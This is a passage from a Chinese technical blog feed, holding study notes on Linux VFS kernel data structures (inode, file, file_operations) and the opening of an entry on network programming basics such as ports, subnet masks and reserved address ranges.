punctuation">;</span><span class="token comment">//直接io进程计数</span>    atomic_t        i_writecount<span class="token punctuation">;</span><span class="token comment">//写进程计数</span>    <span class="token keyword">union</span> <span class="token punctuation">{</span>        <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">file_operations</span>    <span class="token operator">*</span>i_fop<span class="token punctuation">;</span><span class="token comment">//文件函数集合 </span>        <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>free_inode<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">file_lock_context</span>    <span class="token operator">*</span>i_flctx<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">address_space</span>    i_data<span class="token punctuation">;</span>    <span class="token keyword">void</span>            <span class="token operator">*</span>i_private<span class="token punctuation">;</span> <span class="token comment">//私有数据指针</span><span class="token punctuation">}</span> __randomize_layout<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>inode 结构的函数集合，用于具体文件系统根据自己特有的信息构造出 VFS 使用的 inode 结构</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">inode_operations</span> <span class="token punctuation">{</span>    <span class="token comment">//VFS通过系统create()和open()接口来调用该函数，从而为dentry对象创建一个新的索引节点</span>    <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>create<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">dentry</span> <span class="token operator">*</span><span class="token punctuation">,</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//该函数在特定目录中寻找索引节点，该索引节点要对应于dentry中给出的文件名</span>    <span class="token keyword">struct</span> <span class="token class-name">dentry</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token operator">*</span>lookup<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">dentry</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//被系统link()接口调用，用来创建硬连接。硬链接名称由dentry参数指定</span>    <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>link<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">dentry</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">dentry</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//被系统unlink()接口调用，删除由目录项dentry链接的索引节点对象</span>    <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>unlink<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">dentry</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//被系统symlik()接口调用，创建符号连接，该符号连接名称由symname指定，连接对象是dir目录中的dentry目录项</span>    <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>symlink<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">dentry</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//被mkdir()接口调用，创建一个新目录。</span>    <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>mkdir<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">dentry</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//被rmdir()接口调用，删除dentry目录项代表的文件</span>    <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>rmdir<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">dentry</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//被mknod()接口调用，创建特殊文件(设备文件、命名管道或套接字)。</span>    <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>mknod<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">dentry</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">,</span> dev_t<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//VFS调用该函数来移动文件。文件源路径在old_dir目录中，源文件由old_dentry目录项所指定，目标路径在new_dir目录中，目标文件由new_dentry指定</span>    <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>rename<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">dentry</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">dentry</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//被系统readlink()接口调用，拷贝数据到特定的缓冲buffer中。拷贝的数据来自dentry指定的符号链接</span>    <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>readlink<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">dentry</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//被VFS调用，从一个符号连接查找他指向的索引节点</span>    <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>follow_link<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">dentry</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">nameidata</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//在follow_link()调用之后，该函数由vfs调用进行清除工作</span>    <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>put_link<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">dentry</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">nameidata</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//被VFS调用，修改文件的大小，在调用之前，索引节点的i_size项必须被设置成预期的大小</span>    <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>truncate<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//该函数用来检查给定的inode所代表的文件是否允许特定的访问模式，如果允许特定的访问模式，返回0，否则返回负值的错误码</span>    <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>permission<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//被notify_change接口调用，在修改索引节点之后，通知发生了改变事件</span>    <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>setattr<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">dentry</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">iattr</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//在通知索引节点需要从磁盘中更新时，VFS会调用该函数</span>    <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>getattr<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">vfsmount</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">dentry</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">kstat</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//被VFS调用，向dentry指定的文件设置扩展属性</span>    <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>setxattr<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">dentry</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">,</span> size_t<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//被VFS调用，拷贝给定文件的扩展属性name对应的数值</span>    <span class="token function">ssize_t</span> <span class="token punctuation">(</span><span class="token operator">*</span>getxattr<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">dentry</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">,</span> size_t<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//该函数将特定文件所有属性列表拷贝到一个缓冲列表中</span>    <span class="token function">ssize_t</span> <span class="token punctuation">(</span><span class="token operator">*</span>listxattr<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">dentry</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">,</span> size_t<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//该函数从给定文件中删除指定的属性</span>    <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>removexattr<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">dentry</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h5 id="打开的文件">打开的文件</h5><ul><li><p>VFS 设计了文件对象结构来表示进程已打开的文件，应用程序直接处理的就是文件，而不是超级块、索引节点或目录项，文件对象结构包含了访问模式、当前读写偏移等信息</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token punctuation">{</span>    <span class="token keyword">union</span> <span class="token punctuation">{</span>        <span class="token keyword">struct</span> <span class="token class-name">llist_node</span>   fu_llist<span class="token punctuation">;</span>        <span class="token keyword">struct</span> <span class="token class-name">rcu_head</span>     fu_rcuhead<span class="token punctuation">;</span>    <span class="token punctuation">}</span> f_u<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">path</span>     f_path<span class="token punctuation">;</span> <span class="token comment">//文件路径</span>    <span class="token keyword">struct</span> <span class="token class-name">inode</span>        <span class="token operator">*</span>f_inode<span class="token punctuation">;</span>  <span class="token comment">//文件对应的inode</span>    <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">file_operations</span>    <span class="token operator">*</span>f_op<span class="token punctuation">;</span><span class="token comment">//文件函数集合</span>    spinlock_t      f_lock<span class="token punctuation">;</span>  <span class="token comment">//自旋锁</span>    <span class="token keyword">enum</span> <span class="token class-name">rw_hint</span>        f_write_hint<span class="token punctuation">;</span>    atomic_long_t       f_count<span class="token punctuation">;</span><span class="token comment">//文件对象计数据</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span>        f_flags<span class="token punctuation">;</span><span class="token comment">//文件标志</span>    fmode_t         f_mode<span class="token punctuation">;</span><span class="token comment">//文件权限</span>    <span class="token keyword">struct</span> <span class="token class-name">mutex</span>        f_pos_lock<span class="token punctuation">;</span><span class="token comment">//文件读写位置锁</span>    loff_t          f_pos<span class="token punctuation">;</span><span class="token comment">//进程读写文件的当前位置</span>    u64         f_version<span class="token punctuation">;</span><span class="token comment">//文件版本</span>    <span class="token keyword">void</span>            <span class="token operator">*</span>private_data<span class="token punctuation">;</span><span class="token comment">//私有数据</span><span class="token punctuation">}</span> __randomize_layout<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>进程结构中的文件表就是 file 结构的指针数组，进程每打开一个文件就会建立一个 file 结构实例并将其地址放入数组中，最后返回对应的数组下标（open 函数的返回）</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">task_struct</span> <span class="token punctuation">{</span>    <span class="token comment">//</span>    <span class="token keyword">struct</span> <span class="token class-name">fs_struct</span>        <span class="token operator">*</span>fs<span class="token punctuation">;</span>    <span class="token comment">//进程相关的文件系统信息</span>    <span class="token keyword">struct</span> <span class="token class-name">files_struct</span>     <span class="token operator">*</span>files<span class="token punctuation">;</span><span class="token comment">//进程打开的所有文件</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">files_struct</span> <span class="token punctuation">{</span>  <span class="token comment">/*   * read mostly part   */</span>atomic_t count<span class="token punctuation">;</span>bool resize_in_progress<span class="token punctuation">;</span>wait_queue_head_t resize_wait<span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">fdtable</span> __rcu <span class="token operator">*</span>fdt<span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">fdtable</span> fdtab<span class="token punctuation">;</span>  <span class="token comment">/*   * written part on a separate cache line in SMP   */</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">fdtable</span> <span class="token punctuation">{</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> max_fds<span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">file</span> __rcu <span class="token operator">*</span><span class="token operator">*</span>fd<span class="token punctuation">;</span>      <span class="token comment">/* current fd array */</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token operator">*</span>close_on_exec<span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token operator">*</span>open_fds<span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token operator">*</span>full_fds_bits<span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">rcu_head</span> rcu<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>file 结构对应的函数集合 file_operations 结构，这些函数需要具体文件系统来实现，由 VFS 层来调用</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">file_operations</span> <span class="token punctuation">{</span>    <span class="token keyword">struct</span> <span class="token class-name">module</span> <span class="token operator">*</span>owner<span class="token punctuation">;</span><span class="token comment">//所在的模块</span>    <span class="token function">loff_t</span> <span class="token punctuation">(</span><span class="token operator">*</span>llseek<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span><span class="token punctuation">,</span> loff_t<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//调整读写偏移</span>    <span class="token function">ssize_t</span> <span class="token punctuation">(</span><span class="token operator">*</span>read<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">char</span> __user <span class="token operator">*</span><span class="token punctuation">,</span> size_t<span class="token punctuation">,</span> loff_t <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//读</span>    <span class="token function">ssize_t</span> <span class="token punctuation">(</span><span class="token operator">*</span>write<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> __user <span class="token operator">*</span><span class="token punctuation">,</span> size_t<span class="token punctuation">,</span> loff_t <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//写</span>    <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>mmap<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">vm_area_struct</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//映射</span>    <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>open<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//打开</span>    <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>flush<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span><span class="token punctuation">,</span> fl_owner_t id<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//刷新</span>    <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>release<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//关闭</span><span class="token punctuation">}</span> __randomize_layout<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h5 id="四大对象结构的关系">四大对象结构的关系</h5><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220814-vfs.png" style="zoom: 25%;"><h4 id="文件操作">文件操作</h4><h5 id="打开文件">打开文件</h5><h5 id="读写文件">读写文件</h5><h5 id="关闭文件">关闭文件</h5><h3 id="文件系统实例">文件系统实例</h3><h3 id="基于-FUSE-实现自定义文件系统">基于 FUSE 实现自定义文件系统</h3><p>fuse文件系统</p><p>用户空间驱动</p><ul><li><p>1</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220223-fuse.png" alt=""></p></li></ul><h2 id="09-网络模块">09 | 网络模块</h2><blockquote><p>…</p></blockquote><hr class="footnotes-sep"><section class="footnotes"><ol class="footnotes-list"><li id="fn1" class="footnote-item"><p><a href="https://xinqiu.gitbooks.io/linux-insides-cn/content/Booting/linux-bootstrap-4.html">内核引导过程：切换到64位模式</a> <a href="#fnref1" class="footnote-backref">↩︎</a></p></li><li id="fn2" class="footnote-item"><p><a href="https://xinqiu.gitbooks.io/linux-insides-cn/content/Booting/linux-bootstrap-5.html">内核引导过程：内核解压</a> <a href="#fnref2" class="footnote-backref">↩︎</a></p></li><li id="fn3" class="footnote-item"><p><a href="https://zhuanlan.zhihu.com/p/364898425">深入理解Linux内核之内核线程</a> <a href="#fnref3" class="footnote-backref">↩︎</a></p></li><li id="fn4" class="footnote-item"><p><a href="https://mp.weixin.qq.com/s/mosYi_W-Rp1-HgdtxUqSEg">Linux kernel同步机制（上）</a>和<a href="https://mp.weixin.qq.com/s/-GnR-nryH_7xkNVhJ8AMNw">Linux kernel 同步机制（下）</a> <a href="#fnref4" class="footnote-backref">↩︎</a></p></li><li id="fn5" class="footnote-item"><p><a href="https://zhuanlan.zhihu.com/p/133445693">spinlock前世今生</a> <a href="#fnref5" class="footnote-backref">↩︎</a></p></li><li id="fn6" class="footnote-item"><p><a href="https://blog.csdn.net/dog250/article/details/80589442">从CPU缓存一致性的角度看Linux spinlock的不可伸缩性</a> <a href="#fnref6" class="footnote-backref">↩︎</a></p></li><li id="fn7" class="footnote-item"><p><a href="https://www.cnblogs.com/crybaby/p/13062811.html">Linux x86 自旋锁内核源码分析</a> <a href="#fnref7" class="footnote-backref">↩︎</a></p></li><li id="fn8" class="footnote-item"><p><a href="https://zhuanlan.zhihu.com/p/364044713">Linux 读写锁 rwlock</a> <a href="#fnref8" class="footnote-backref">↩︎</a></p></li><li id="fn9" class="footnote-item"><p><a href="https://mp.weixin.qq.com/s/viUgMAnVgC_bHyVifkHqsQ">自旋锁探秘</a> <a href="#fnref9" class="footnote-backref">↩︎</a></p></li><li id="fn10" class="footnote-item"><p><a href="https://zhuanlan.zhihu.com/p/377946859">Linux 用户空间与内核空间及分段机制</a> <a href="#fnref10" class="footnote-backref">↩︎</a></p></li><li id="fn11" class="footnote-item"><p><a href="https://www.toutiao.com/a6855591224003265036/?log_from=42a7e1ffc21a_1637399126505">Linux 内核中逻辑、虚拟、线性和物理地址大扫盲</a> <a href="#fnref11" class="footnote-backref">↩︎</a></p></li><li id="fn12" class="footnote-item"><p><a href="https://blog.csdn.net/mirage1993/article/details/71156109">Linux 内核中逻辑地址/虚拟地址/线性地址三者的区别</a> <a href="#fnref12" class="footnote-backref">↩︎</a></p></li><li id="fn13" class="footnote-item"><p><a href="https://www.bilibili.com/read/cv8129309">页表映射机制：线性地址如何转为物理地址？</a> <a href="#fnref13" class="footnote-backref">↩︎</a></p></li><li id="fn14" class="footnote-item"><p><a href="https://zhuanlan.zhihu.com/p/68465952">Linux中的物理内存管理</a> <a href="#fnref14" class="footnote-backref">↩︎</a></p></li></ol></section>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络编程原理与实践</title>
      <link href="2021/02/04/cs-network-socket/"/>
      <url>2021/02/04/cs-network-socket/</url>
      
        <content type="html"><![CDATA[<h2 id="00-前言">00 | 前言</h2><p>  在计算机领域中，网络是信息传输、接收、共享的虚拟平台，通过它把各个点、面、体的信息联系到一起，可以进行<strong>数据通信</strong>，从而实现<strong>资源共享</strong></p><p>  网络编程从大方面说就是对信息的发送到接受，通过操作相应 API 调度计算机硬件资源，并利用传输管道（网线）进行数据交换的过程</p><p>  一些关于网络编程方面的问题看似简单，但想做到完全理解却并不容易，学习高性能网络编程，需要掌握两个核心要点：<strong>第一就是理解网络协议，并在这个基础上和操作系统内核配合，感知各种网络 I/O 事件；第二就是学会使用线程处理并发</strong></p><p>  本文会从实践出发，从问题的角度对知识点进行阐述</p><p>​</p><p>​</p><h2 id="01-网络编程入门">01 | 网络编程入门</h2><h3 id="1-1-基本概念">1.1 基本概念</h3><h4 id="1-1-1-客户端-服务器网络模型">1.1.1 客户端 - 服务器网络模型</h4><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20210127-network-model.png" alt=""></p><ul><li><p>工作流程</p><ol><li><p>服务器处于接收请求的状态</p></li><li><p>客户端向服务器端发送服务请求，并等待接收结果</p></li><li><p>服务器端收到这个请求后，会根据双方约定的格式解释它，进行必要处理</p></li><li><p>服务器端完成处理请求之后，会给客户端发送一个响应，然后等待客户端的下一步操作</p></li><li><p>客户端收到响应并进行处理</p></li></ol></li><li><p>主要特征</p><ul><li>客户是服务请求方，服务器是服务提供方，区别出客户端和服务器，本质上是因为二者编程模型是不同的，但无论是客户端，还是服务器端，它们<strong>运行的单位都是进程</strong></li><li>网络中各计算机的地位不平等，整个网络的管理工作由服务器担当，因此管理集中方便</li><li>客户机之间不直接通信</li><li>可扩展性不佳</li></ul></li></ul><p>​</p><h4 id="1-1-2-IP-和端口">1.1.2 IP 和端口</h4><ul><li><p>在 TCP/IP 协议栈中，IP 用来表示网络世界的地址</p></li><li><p>在一台计算机上是可以同时存在多个连接的，区分出不同的连接就需要用到端口这个概念</p><blockquote><p>端口号是一个 16 位的整数，最多为 65536</p></blockquote></li><li><p><strong>计算机的 IP 地址是唯一的，每个连接的端口号是不同的</strong></p></li><li><p>当一个客户端发起连接请求时，客户端的端口是由操作系统内核临时分配的，称为<strong>临时端口</strong>，服务器端的端口通常是一个众所周知的端口<code>Well Known Ports</code></p></li><li><p>一个连接可以通过客户端 - 服务器端的 IP 和端口唯一确定，这叫做<strong>套接字对</strong>，按照（客户端地址、客户端端口、服务端地址、服务端端口）这样的四元组表示：</p><pre class="line-numbers language-none"><code class="language-none">（clientaddr:clientport, serveraddr: serverport)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20210127-connection.png" alt="一个客户端 - 服务器之间的连接"></p></li></ul><p>​</p><p>​</p><h4 id="1-1-3-子网掩码">1.1.3 子网掩码</h4><p>  在网络 IP 划分的时候需要区分两个概念：</p><ul><li><p>网络<code>network</code>：表示这组 IP 共同的部分，比如在 <strong>192.168.1.1</strong>~<strong>192.168.1.255</strong> 这个区间里，它们共同的部分是 <strong>192.168.1.0</strong></p></li><li><p>主机<code>host</code>：表示这组 IP 不同的部分，上例中 1~255 就是不同的部分，表示有 255 个可用的不同 IP</p><blockquote><p>例如 IPv4 地址，<strong>192.0.2.12</strong>，前面三个 bytes 是子网，最后一个 byte 是 host，或者说 host 为 8 位，子网掩码为 <strong>192.0.2.0/24</strong>（<strong>255.255.255.0</strong>）</p></blockquote></li><li><p>网络地址位数由子网掩码<code>Netmask</code>决定，<strong>将 IP 地址与子网掩码进行位与操作，就能得到网络的值</strong></p></li><li><p><strong>注意</strong>：子网掩码的格式永远都是二进制格式：前面是一连串的 1，后面跟着一连串的 0</p><blockquote><p><strong>255.192.0.0</strong> 这样的子网掩码无法直观地知道有多少个 1，多少个 0，后来有了新的表示方法：<strong>IP / 网络的位数</strong><br>如 IP <strong>192.0.2.12/30</strong>：有 30 个 1， 2 个 0，主机个数为 4</p></blockquote></li></ul><p>​</p><p>​</p><h4 id="1-1-4-保留网段和端口">1.1.4 保留网段和端口</h4><h5 id="保留网段">保留网段</h5><ul><li><p>国际标准组织在 IPv4 地址空间里面专门划出了一些网段，这些网段不会用做公网上的 IP 而是仅仅保留做内部使用，这些地址称作保留网段</p></li><li><p>下表是三个保留网段，用于专用网络中的本地通信</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20210127-reserved-network-ranges.png" alt=""></p></li><li><p><code>255.255.255.255/32</code>：用于受限广播地址</p></li><li><p><code>224.0.0.0/4</code>：用于多播</p></li></ul><p>​</p><h5 id="保留端口">保留端口</h5><ul><li><p>保留端口就是大家约定俗成的，已经被对应服务广为使用的端口，比如 ftp 的 21 端口，ssh 的 22 端口，http 的 80 端口等</p></li><li><p>glibc 定义的保留端口：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* Standard well-known ports.  */</span><span class="token keyword">enum</span>  <span class="token punctuation">{</span>    IPPORT_ECHO <span class="token operator">=</span> <span class="token number">7</span><span class="token punctuation">,</span>    <span class="token 